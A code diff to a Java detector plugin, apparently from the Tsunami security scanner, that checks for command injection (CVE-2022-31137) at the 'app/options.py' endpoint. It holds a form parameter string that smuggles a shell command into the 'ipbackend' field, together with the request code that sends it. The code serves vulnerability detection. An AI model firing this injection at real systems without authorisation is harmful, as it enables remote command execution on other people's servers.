@@ -1,5 +1,5 @@
 /*
- * Copyright 2022 Google LLC
+ * Copyright 2024 Google LLC
  *
  * Licensed under the Apache License, Version 2.0 (the "License");
  * you may not use this file except in compliance with the License.
@@ -17,7 +17,6 @@ package com.google.tsunami.plugins.detectors.cves.cve202231137;
 
 import static com.google.common.base.Preconditions.checkNotNull;
 import static com.google.common.collect.ImmutableList.toImmutableList;
-import static com.google.common.net.HttpHeaders.CONTENT_TYPE;
 import static com.google.tsunami.common.net.http.HttpRequest.get;
 import static com.google.tsunami.common.net.http.HttpRequest.post;
 
@@ -28,7 +27,6 @@ import com.google.protobuf.ByteString;
 import com.google.protobuf.util.Timestamps;
 import com.google.tsunami.common.data.NetworkServiceUtils;
 import com.google.tsunami.common.net.http.HttpClient;
-import com.google.tsunami.common.net.http.HttpHeaders;
 import com.google.tsunami.common.net.http.HttpResponse;
 import com.google.tsunami.common.time.UtcClock;
 import com.google.tsunami.plugin.PluginType;
@@ -64,8 +62,7 @@ import javax.inject.Inject;
 public final class Cve202231137Detector implements VulnDetector {
   private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();
   @VisibleForTesting static final String VULNERABLE_REQUEST_PATH = "app/options.py";
-  private static final String HTTP_PARAMETERS =
-      "alert_consumer=1&serv=127.0.0.1&ipbackend=\";%s+##&backend_server=127.0.0.1";
+  private static final String HTTP_PARAMETERS = "alert_consumer=1&ipbackend=\";%s+#";
 
   private final Clock utcClock;
   private final HttpClient httpClient;
@@ -113,8 +110,7 @@ public final class Cve202231137Detector implements VulnDetector {
   }
 
   private boolean isServiceVulnerable(NetworkService networkService) {
-    return (payloadGenerator.isCallbackServerEnabled() && isVulnerableWithCallback(networkService))
-        || isVulnerableWithoutCallback(networkService);
+    return isVulnerableWithoutCallback(networkService);
   }
 
   private boolean isVulnerableWithoutCallback(NetworkService networkService) {
@@ -130,58 +126,28 @@ public final class Cve202231137Detector implements VulnDetector {
     Payload payload = payloadGenerator.generate(config);
     String cmd = payload.getPayload();
 
-    HttpResponse response =
-        sendRequest(
-            networkService,
-            String.format(HTTP_PARAMETERS, URLEncoder.encode(cmd, StandardCharsets.UTF_8)));
-    if (response != null) {
-      if (response.bodyString().isEmpty()) {
-        return false;
-      }
-      return payload.checkIfExecuted(response.bodyString().get());
-    } else return false;
-  }
-
-  private boolean isVulnerableWithCallback(NetworkService networkService) {
-    PayloadGeneratorConfig config =
-        PayloadGeneratorConfig.newBuilder()
-            .setVulnerabilityType(PayloadGeneratorConfig.VulnerabilityType.BLIND_RCE)
-            .setInterpretationEnvironment(
-                PayloadGeneratorConfig.InterpretationEnvironment.LINUX_SHELL)
-            .setExecutionEnvironment(
-                PayloadGeneratorConfig.ExecutionEnvironment.EXEC_INTERPRETATION_ENVIRONMENT)
-            .build();
-
-    Payload payload = payloadGenerator.generate(config);
-    String cmd = payload.getPayload();
-
-    sendRequest(
-        networkService,
-        String.format(HTTP_PARAMETERS, URLEncoder.encode(cmd, StandardCharsets.UTF_8)));
-
-    return payload.checkIfExecuted();
-  }
-
-  private HttpResponse sendRequest(NetworkService networkService, String Payload) {
-    HttpHeaders httpHeaders =
-        HttpHeaders.builder()
-            .addHeader(CONTENT_TYPE, "application/x-www-form-urlencoded; charset=UTF-8")
-            .addHeader("X-Requested-With", "XMLHttpRequest")
-            .build();
-
+    HttpResponse response = null;
     String targetVulnerabilityUrl =
         NetworkServiceUtils.buildWebApplicationRootUrl(networkService) + VULNERABLE_REQUEST_PATH;
     try {
-      return httpClient.send(
-          post(targetVulnerabilityUrl)
-              .setHeaders(httpHeaders)
-              .setRequestBody(ByteString.copyFromUtf8(Payload))
-              .build(),
-          networkService);
+      response =
+          httpClient.send(
+              post(targetVulnerabilityUrl)
+                  .withEmptyHeaders()
+                  .setRequestBody(
+                      ByteString.copyFromUtf8(
+                          String.format(
+                              HTTP_PARAMETERS, URLEncoder.encode(cmd, StandardCharsets.UTF_8))))
+                  .build(),
+              networkService);
     } catch (IOException | AssertionError e) {
       logger.atWarning().withCause(e).log("Request to target %s failed", networkService);
-      return null;
     }
+    if (response == null || response.bodyString().isEmpty()) {
+      return false;
+    }
+
+    return payload.checkIfExecuted(response.bodyString().get());
   }
 
   @VisibleForTesting
